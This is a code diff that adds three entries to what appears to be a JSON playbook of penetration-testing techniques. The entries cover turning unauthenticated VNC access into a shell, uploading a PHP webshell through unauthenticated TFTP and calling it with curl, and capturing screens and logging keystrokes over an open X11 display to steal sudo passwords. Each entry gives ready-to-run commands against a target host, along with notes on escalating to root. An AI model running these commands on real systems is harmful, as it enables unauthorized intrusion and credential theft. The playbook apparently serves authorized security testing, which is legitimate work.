@@ -323,6 +323,47 @@
       ]
     },
     {
+      "id": "vnc-desktop-shell",
+      "title": "VNC Desktop to Shell",
+      "hypothesis": "A VNC session (unauthenticated, or a cracked/short VNC password) puts you at the victim's live desktop — and a desktop is one terminal away from a shell. Open a terminal in the session and run your commands, or type a reverse shell straight in. The graphical foothold becomes a real one.",
+      "tool": "vncviewer",
+      "tools": [
+        "vncviewer",
+        "xdotool"
+      ],
+      "os": [
+        "linux"
+      ],
+      "requires_all": [
+        "access.desktop"
+      ],
+      "produces": [
+        "foothold.linux"
+      ],
+      "priority": 52,
+      "proves": "command execution from the VNC desktop session — a foothold",
+      "does_not_prove": "privilege beyond the desktop user; escalate from the shell",
+      "report": {
+        "finding": "Interactive VNC Desktop Access",
+        "severity": "high"
+      },
+      "refs": [
+        "https://book.hacktricks.xyz/network-services-pentesting/pentesting-vnc"
+      ],
+      "commands": [
+        {
+          "tool": "vncviewer",
+          "run": "vncviewer {{target}}::5900",
+          "note": "Connect to the desktop (add -passwd pass.txt for a cracked password). Open a terminal application in the session."
+        },
+        {
+          "tool": "xdotool",
+          "run": "id; hostname; ip -4 addr | grep inet",
+          "note": "In the desktop's terminal, run this and screenshot the frame — that captures the foothold with host identity. From here enumerate for root exactly like any shell."
+        }
+      ]
+    },
+    {
       "id": "recon-smtp",
       "title": "SMTP User Enumeration",
       "hypothesis": "A mail server that honours VRFY/EXPN/RCPT will confirm which usernames are real, a quiet oracle that feeds a spray list. An open relay, if present, is a separate finding worth its own note.",
@@ -907,6 +948,48 @@
       ]
     },
     {
+      "id": "tftp-write-shell",
+      "title": "TFTP Write to Shell",
+      "hypothesis": "TFTP has no auth and, when its root sits on a writable, executable path, you can PUT a file that runs. If the TFTP directory is the web root, upload a webshell and request it; if it maps onto a cron or startup path, drop a job. An unauthenticated write that lands in the right place is a foothold.",
+      "tool": "tftp",
+      "tools": [
+        "tftp",
+        "curl"
+      ],
+      "os": [
+        "linux"
+      ],
+      "requires_any": [
+        "port:69",
+        "tftp.reachable"
+      ],
+      "produces": [
+        "foothold.linux"
+      ],
+      "priority": 50,
+      "proves": "code execution from an unauthenticated TFTP write that landed in an executable path",
+      "does_not_prove": "a shell when the TFTP root is isolated from any served/executed location",
+      "report": {
+        "finding": "Unauthenticated TFTP Write",
+        "severity": "high"
+      },
+      "refs": [
+        "https://book.hacktricks.xyz/network-services-pentesting/69-udp-tftp"
+      ],
+      "commands": [
+        {
+          "tool": "tftp",
+          "run": "tftp {{target}} -c put shell.php",
+          "note": "PUT a webshell (match the stack's language). TFTP is silent on success, so verify by requesting it next."
+        },
+        {
+          "tool": "curl",
+          "run": "curl \"http://{{target}}/shell.php?c=id\"",
+          "note": "If the TFTP root was the web root, your file is now served: run a command. `uid=...` is the foothold; swap in a reverse shell and catch it with the listener card."
+        }
+      ]
+    },
+    {
       "id": "recon-x11",
       "title": "X11 Open Display Abuse",
       "phase": "recon",
@@ -949,6 +1032,48 @@
           "tool": "xdotool",
           "run": "DISPLAY={{target}}:0 xdotool getwindowfocus getwindowname",
           "note": "Read the focused window (xdotool reads the X server from DISPLAY, not a flag); from here key-logging and input injection follow."
+        }
+      ]
+    },
+    {
+      "id": "x11-keylog",
+      "title": "X11 Keylog / Screen Capture to Credentials",
+      "hypothesis": "An open X11 display (access control off) is a window onto the logged-in user's session: snapshot the screen for secrets on show, and log keystrokes to catch passwords as they are typed — including the sudo password. Those captured credentials are your way to a shell and to root, so X11 is a credential oracle, not just a curiosity.",
+      "tool": "xwd",
+      "tools": [
+        "xwd",
+        "xdotool"
+      ],
+      "os": [
+        "linux"
+      ],
+      "requires_any": [
+        "port:6000",
+        "x11.reachable"
+      ],
+      "produces": [
+        "credential.candidate"
+      ],
+      "priority": 50,
+      "proves": "secrets visible on the victim's desktop and keystrokes it typed — candidate credentials",
+      "does_not_prove": "a shell by itself; the captured password still has to be used on SSH/su/sudo",
+      "report": {
+        "finding": "Unauthenticated X11 Session Access",
+        "severity": "high"
+      },
+      "refs": [
+        "https://book.hacktricks.xyz/network-services-pentesting/6000-pentesting-x11"
+      ],
+      "commands": [
+        {
+          "tool": "xwd",
+          "run": "xwd -root -display {{target}}:0 -out screen.xwd && convert screen.xwd screen.png",
+          "note": "Grab the current screen — terminals, password managers and chat windows routinely show secrets. Eyeball screen.png."
+        },
+        {
+          "tool": "xdotool",
+          "run": "xspy {{target}}:0",
+          "note": "Log keystrokes from the session. Watch for the sudo/su password being typed; that single capture is often the whole path to root. Paste what you capture and obol records the candidate credential."
         }
       ]
     },
